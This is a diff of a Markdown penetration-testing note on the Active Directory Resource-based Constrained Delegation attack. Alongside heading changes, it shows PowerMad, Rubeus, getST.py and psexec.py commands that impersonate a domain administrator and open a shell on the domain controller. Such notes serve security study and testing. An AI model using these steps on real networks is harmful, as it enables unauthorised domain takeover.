@@ -1,21 +1,22 @@
 # Resource-based Constrained Delegation
 
-## Overview
+# Overview
 - We have *code execution* on the computer `(COM01)` as the current user.
 - User creates a new computer object `(FAKE01)`.
 - User leverages the **WRITE** privilege on the `(COM01)` computer object and updates its object's attribute **msDS-AllowedToActOnBehalfOfOtherIdentity** to enable the newly created computer `(FAKE01)` to impersonate and authenticate any domain user that can then access the target system `(COM01)`.      
 `(COM01)` trusts `(FAKE01)` due to the modified *msDS-AllowedToActOnBehalfOfOtherIdentity*.
 - We request Kerberos tickets for `(FAKE01)`$ with ability to impersonate an admin user.
 
-## Tools needed
+# Tools Needed
 - [PowerMad](https://github.com/Kevin-Robertson/Powermad)
 - [Rubeus](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe)
 - [getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)
 - [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
 
-## Exploitation
+
+# Exploitation
 *Assumption is that the attacker has access to the system through winrm*
-### Local
+## Local
 ```powershell
 # Verify if user can add new computers
 Get-DomainObject -Identity 'dc=domain,dc=local' | select 
@@ -44,7 +45,7 @@ Get-ADComputer (Get-Variable -Name "target").Value -Properties PrincipalsAllowed
 .\Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:domain.local
 ```
 
-### Remote
+## Remote
 ```bash
 # Generate a ccached TGT
 getST.py domain.local/FAKE01 -dc-ip dc.domain.local -impersonate administrator -spn http/dc.domain.local -aesKey <aes key from Rubeus output>
@@ -56,6 +57,6 @@ export KRB5CCNAME=administrator.ccache
 psexec.py domain.local/administrator@dc.domain.local -no-pass -k
 ```
 
-## References
+# References
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
 - [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
